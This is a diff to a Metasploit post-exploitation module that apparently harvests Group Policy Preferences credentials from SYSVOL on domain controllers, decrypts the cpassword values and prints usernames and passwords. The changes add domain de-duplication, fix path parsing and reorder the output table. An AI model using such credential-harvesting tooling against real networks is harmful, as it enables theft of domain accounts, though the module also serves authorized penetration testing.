@@ -66,6 +66,7 @@ class Metasploit3 < Msf::Post
 		dcs = []
 		basepaths = []
 		fullpaths = []
+		@enumed_domains = []
 
 		print_status "Checking locally.."
 		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
@@ -74,7 +75,7 @@ class Metasploit3 < Msf::Post
 			print_good "Policy Sahres found locally"
 		end
 
-		if datastore['ALL'] and datastore['DOMAINS'].empty?
+		if datastore['ALL'] and datastore['DOMAINS'].blank?
 			domains = enum_domains
 			domains.reject!{|n| n == "WORKGROUP"}
 		end
@@ -88,6 +89,7 @@ class Metasploit3 < Msf::Post
 
 		domains.each do |domain| 
 			dcs = enum_dcs(domain)
+			next if dcs.blank?
 			dcs.uniq!
 			tbase = []
 			dcs.each do |dc| 
@@ -167,11 +169,15 @@ class Metasploit3 < Msf::Post
 
 			spath = path.split('\\')
 			retobj = {
-				:domain => spath[2],
-				:dc     => spath[0],
+				:dc     => spath[2],
 				:path   => path,
 				:xml    => REXML::Document.new(data).root
 			}	
+			if spath[4] == "sysvol"
+				retobj[:domain] = spath[5] 
+			else
+				retobj[:domain] = spath[4]
+			end
 			return retobj
 		rescue Rex::Post::Meterpreter::RequestError => e
 			print_error "Received error code #{e.code} when reading #{path}"
@@ -185,6 +191,8 @@ class Metasploit3 < Msf::Post
 		mxml.elements.to_a("//Properties").each do |node|
 			epassword = node.attributes['cpassword']
 			next if epassword.to_s.empty?
+			next if @enumed_domains.include? xmlfile[:domain]
+			@enumed_domains << xmlfile[:domain]
 			pass = decrypt(epassword)
 
 			user = node.attributes['runAs'] if node.attributes['runAs']
@@ -200,18 +208,20 @@ class Metasploit3 < Msf::Post
 
 
 			table = Rex::Ui::Text::Table.new(
-				'Header'  => 'Group Policy Credential Info',
-				'Indent'   => 1,
-				'Columns' =>
+				'Header'     => 'Group Policy Credential Info',
+				'Indent'     => 1,
+				'SortIndex'  => 5,
+				'Columns'    =>
 				[
 					'Name',
 					'Value',
 				]
 			)
-			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
-			table << ["DOMAIN", xmlfile[:domain] ]
+
 			table << ["USERNAME", user ]
 			table << ["PASSWORD", pass]
+			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
+			table << ["DOMAIN", xmlfile[:domain] ]
 			table << ["CHANGED", changed]
 			table << ["EXPIRES", expires] unless expires.blank?
 			table << ["NEVER_EXPIRES?", never_expires] unless never_expires.blank?
@@ -343,7 +353,7 @@ class Metasploit3 < Msf::Post
 		rescue Rex::Post::Meterpreter::RequestError => e
 			print_error "Received error code #{e.code} - #{e.message} when reading the registry."
 		end
-		domain = domain.split('.')[0]
+		domain = domain.split('.')[0].upcase
 
 		return domain
 	end
